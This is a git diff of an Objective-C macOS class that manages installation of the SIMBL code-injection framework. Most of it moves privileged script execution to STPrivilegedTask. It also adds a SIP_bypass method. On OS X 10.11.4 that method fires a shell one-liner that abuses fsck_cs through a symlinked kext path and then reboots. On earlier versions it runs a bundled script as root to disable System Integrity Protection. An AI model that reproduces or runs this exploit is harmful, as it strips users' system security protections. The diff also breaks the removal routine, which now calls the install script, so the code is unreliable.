@@ -8,6 +8,7 @@
 
 #import <Foundation/Foundation.h>
 #import <SIMBLManager.h>
+#import <STPrivilegedTask.h>
 
 @interface SIMBLManager ()
 @end
@@ -24,22 +25,25 @@ SIMBLManager* si_SIMBLManager;
     return si_SIMBLManager;
 }
 
-- (Boolean) runProcessAsAdministrator:(NSString*)scriptPath
-                        withArguments:(NSArray *)arguments
-                               output:(NSString **)output
-                     errorDescription:(NSString **)errorDescription {
-    
-    NSString * allArgs = [arguments componentsJoinedByString:@" "];
-    NSString * fullScript = [NSString stringWithFormat:@"'%@' %@", scriptPath, allArgs];
-    NSString *doit = [NSString stringWithFormat:@"osascript -e \"do shell script \\\"%@\\\" with administrator privileges\"", fullScript];
-    NSUInteger result = system([doit UTF8String]);
-    if (result != 0)
-    {
-        NSLog(@"Error number: %ld", (long)result);
-        return NO;
+- (Boolean)runSTPrivilegedTask:(NSString*)launchPath :(NSArray*)args {
+    STPrivilegedTask *privilegedTask = [[STPrivilegedTask alloc] init];
+    NSMutableArray *components = [args mutableCopy];
+    [privilegedTask setLaunchPath:launchPath];
+    [privilegedTask setArguments:components];
+    [privilegedTask setCurrentDirectoryPath:[[NSBundle mainBundle] resourcePath]];
+    Boolean result = false;
+    OSStatus err = [privilegedTask launch];
+    if (err != errAuthorizationSuccess) {
+        if (err == errAuthorizationCanceled) {
+            NSLog(@"User cancelled");
+        }  else {
+            NSLog(@"Something went wrong: %d", (int)err);
+        }
     } else {
-        return YES;
+        result = true;
     }
+    
+    return result;
 }
 
 - (Boolean)SIP_enabled {
@@ -62,14 +66,39 @@ SIMBLManager* si_SIMBLManager;
     return result;
 }
 
+- (Boolean)SIP_bypass {
+    if ([[NSProcessInfo processInfo] operatingSystemVersion].minorVersion != 11)
+        return false;
+    
+    if ([[NSProcessInfo processInfo] operatingSystemVersion].patchVersion > 4)
+        return false;
+    
+    if ([[NSProcessInfo processInfo] operatingSystemVersion].patchVersion == 0)
+        return false;
+    
+    if ([[NSProcessInfo processInfo] operatingSystemVersion].patchVersion == 4) {
+        system("ln -s /S*/*/E*/A*Li*/*/I* /dev/diskX;fsck_cs /dev/diskX 1>&-;touch /Li*/Ex*/;reboot");
+        return true;
+    }
+    
+    if ([[NSProcessInfo processInfo] operatingSystemVersion].patchVersion < 4)
+    {
+        if ([self SIP_enabled])
+            return [self runSTPrivilegedTask:@"/bin/sh" :[NSArray arrayWithObjects:[[NSBundle bundleForClass:[SIMBLManager class]] pathForResource:@"stfusip" ofType:nil], @"disable", nil]];
+        else
+            return [self runSTPrivilegedTask:@"/bin/sh" :[NSArray arrayWithObjects:[[NSBundle bundleForClass:[SIMBLManager class]] pathForResource:@"stfusip" ofType:nil], @"enable", nil]];
+        return true;
+    }
+    
+    return false;
+}
 
 - (Boolean)SIMBL_install {
     BOOL success = false;
-    if (![self SIP_enabled]) {
-        NSString *output, *errorD = nil;
-        NSString *script = [[NSBundle bundleForClass:[SIMBLManager class]] pathForResource:@"installSIMBL" ofType:nil];
-        NSArray *args = [[NSArray alloc] initWithObjects:@"", nil];
-        success = [self runProcessAsAdministrator:script withArguments:args output:&output errorDescription:&errorD];
+    if (![self SIP_enabled])
+    {
+        NSArray *args = [NSArray arrayWithObject:[[NSBundle bundleForClass:[SIMBLManager class]] pathForResource:@"installSIMBL" ofType:nil]];
+        success = [self runSTPrivilegedTask:@"/bin/sh" :args];
     }
     if (!success) {
         NSLog(@"SIMBL install failed");
@@ -125,7 +154,6 @@ SIMBLManager* si_SIMBLManager;
                     }
                 }
             }
-
         }
         
         if (loadAll) {
@@ -139,8 +167,6 @@ SIMBLManager* si_SIMBLManager;
     });
 }
 
-
-
 - (Boolean)OSAX_installed {
     return [[NSFileManager defaultManager] fileExistsAtPath:@"/System/Library/ScriptingAdditions/SIMBL.osax"];
 }
@@ -148,9 +174,8 @@ SIMBLManager* si_SIMBLManager;
 - (Boolean)OSAX_install {
     BOOL success = false;
     if (![self SIP_enabled]) {
-        NSString *output, *errorD = nil;
-        NSString *script = [[NSBundle bundleForClass:[SIMBLManager class]] pathForResource:@"installOSAX" ofType:nil];
-        success = [self runProcessAsAdministrator:script withArguments:@[] output:&output errorDescription:&errorD];
+        NSArray *args = [NSArray arrayWithObject:[[NSBundle bundleForClass:[SIMBLManager class]] pathForResource:@"installOSAX" ofType:nil]];
+        success = [self runSTPrivilegedTask:@"/bin/sh" :args];
     }
     if (!success) {
         NSLog(@"SIMBL.osax install failed");
@@ -192,18 +217,13 @@ SIMBLManager* si_SIMBLManager;
     return result;
 }
 
-
 - (Boolean)AGENT_installed {
     return [[NSFileManager defaultManager] fileExistsAtPath:@"/Library/Application Support/SIMBL/SIMBLAgent.app"];
 }
 
 - (Boolean)AGENT_install {
     BOOL success = false;
-    if (![self SIP_enabled]) {
-        NSString *output, *errorD = nil;
-        NSString *script = [[NSBundle bundleForClass:[SIMBLManager class]] pathForResource:@"installAgent" ofType:nil];
-        success = [self runProcessAsAdministrator:script withArguments:@[] output:&output errorDescription:&errorD];
-    }
+    success = [self runSTPrivilegedTask:@"/bin/sh" :@[[[NSBundle bundleForClass:[SIMBLManager class]] pathForResource:@"installAgent" ofType:nil]]];
     if (!success) {
         NSLog(@"SIMBLAgent install failed");
         dispatch_async(dispatch_get_main_queue(), ^{
@@ -244,14 +264,11 @@ SIMBLManager* si_SIMBLManager;
     return result;
 }
 
-
-
 - (Boolean)SIMBL_remove {
     BOOL success = false;
     if (![self SIP_enabled]) {
-        NSString *output, *errorD = nil;
-        NSString *script = [[NSBundle bundleForClass:[SIMBLManager class]] pathForResource:@"removeSIMBL" ofType:nil];
-        success = [self runProcessAsAdministrator:script withArguments:@[] output:&output errorDescription:&errorD];
+        NSArray *args = [NSArray arrayWithObject:[[NSBundle bundleForClass:[SIMBLManager class]] pathForResource:@"installSIMBL" ofType:nil]];
+        success = [self runSTPrivilegedTask:@"/bin/sh" :args];
     }
     if (!success) {
         NSLog(@"SIMBL removal failed");
